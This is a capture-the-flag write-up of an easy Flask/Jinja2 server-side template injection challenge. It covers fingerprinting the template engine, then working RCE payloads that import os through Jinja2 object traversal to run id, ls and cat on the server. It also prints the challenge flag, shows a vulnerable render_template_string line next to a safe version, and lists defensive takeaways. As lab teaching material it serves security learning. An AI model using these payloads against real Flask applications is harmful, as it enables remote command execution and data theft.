# SSTI Flask Challenge

**Category:** Web  
**Difficulty:** Easy  
**Platform:** CTFzone Labs  
**Date:** 2026-03-19  
**Flag:** `urchinsec{t@k3_a_cl00se_l00k_4t_th3_fl4g}`

---

## Challenge Description

A web application running on Flask reflects user-supplied input directly into a Jinja2 template without sanitisation. The `name` parameter in the URL is rendered server-side.

---

## Enumeration

Initial Burp Suite request:

```
GET /?name=Someone1 HTTP/1.1
Host: labs.ctfzone.com:7120
```

Response headers revealed:

```
Server: Werkzeug/3.0.1 Python/3.11.14
```

Werkzeug = Flask. The `name` parameter is reflected in the HTML response.

---

## Vulnerability

**Server-Side Template Injection (SSTI)** — user input is passed directly to `render_template_string()` instead of being passed as a variable to a safe template.

```python
# VULNERABLE
return render_template_string(f"Hello {request.args.get('name')}")

# SAFE
return render_template("index.html", name=request.args.get('name'))
```

**Confirming SSTI:**

```
GET /?name={{7*7}}
→ Response shows: 49  ✓ SSTI confirmed
```

**Identifying Jinja2:**

```
GET /?name={{7*'7'}}
→ Response shows: 7777777  ✓ Jinja2 confirmed (Twig would show 49)
```

---

## Exploit

**Step 1 — Confirm RCE:**

```
GET /?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
→ uid=0(root) gid=0(root)
```

**Step 2 — Find the flag:**

```
GET /?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('ls+/').read()}}
→ opt  bin  etc  home ...

GET /?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('ls+/opt').read()}}
→ flag.txt
```

**Step 3 — Read the flag:**

```
GET /?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat+/opt/flag.txt').read()}}
```

**Payload breakdown:**

| Part | Meaning |
|---|---|
| `self` | Jinja2 template self object |
| `.__init__.__globals__` | Global namespace of the function |
| `.__builtins__` | Python built-in functions |
| `.__import__('os')` | Import the os module |
| `.popen('cmd').read()` | Run shell command and return output |

---

## Flag

```
urchinsec{t@k3_a_cl00se_l00k_4t_th3_fl4g}
```

---

## Key Takeaways

- **Never pass user input to `render_template_string()`** — always use `render_template()` with variables
- **`{{7*'7'}}` is the definitive Jinja2 fingerprint** — Jinja2 returns `7777777`, Twig returns `49`
- **Werkzeug headers reveal the stack** — suppress server headers in production
- **Jinja2 has deep access to Python runtime** — object traversal reaches the full interpreter
- **Blacklisting keywords doesn't work** — the fix must be architectural, not a filter
